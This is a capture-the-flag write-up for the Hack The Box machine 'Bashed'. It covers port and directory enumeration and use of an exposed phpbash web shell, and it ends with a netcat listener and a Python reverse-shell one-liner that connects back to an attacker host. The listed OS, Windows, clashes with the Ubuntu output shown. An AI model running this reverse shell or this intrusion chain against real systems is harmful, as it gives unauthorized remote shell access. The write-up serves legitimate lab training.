# htb-bashed
This is my [Hack the box](https://www.hackthebox.eu/)'s Bashed machine write-up.

## Machine
OS: Windows

IP: 10.10.10.68

Difficulty: Easy

## Initial enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN bashed.nmap $BASHED`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:/home/kali# nmap -sC -sV -Pn -oN bashed.nmap $BASHED
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 20:01 EDT
Nmap scan report for 10.10.10.68 (10.10.10.68)
Host is up (0.23s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

There's a web server running on port 80. Get paths using gobuster:
```
root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --url http://10.10.10.68 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/26 20:26:58 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/08/26 20:30:57 Finished
===============================================================
```

The page on port 80 advertises a web shell: [phpbash](https://github.com/Arrexel/phpbash). It mentions the tool was built on this server which makes us think it could be accessible. `/dev/phpbash.php` is its location.

Get some situational awareness information using the shell:
```
www-data@bashed:/var/www/html/dev# uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

www-data@bashed:/var/www/html/dev# whoami
www-data

www-data@bashed:/var/www/html/dev# env
OLDPWD=/var/www/html/dev
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/dev


www-data@bashed:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

It is possible already to grab the user flag from `home/arrexel`: `cat /home/arrexel/user.txt`

It is possible to verify Python is installed and can be used: `python --version`. Let's trigger a reverse shell using it.

First, let's set up the listener on the attacker machine:
```bash
sudo nc -lvp 8888 
```

Then, with a little help from the pentestmonkey's [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), hit the listener from the phpbash web interface (replace IP and port by the listener's):
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

It pops a shell immediately on the listener!
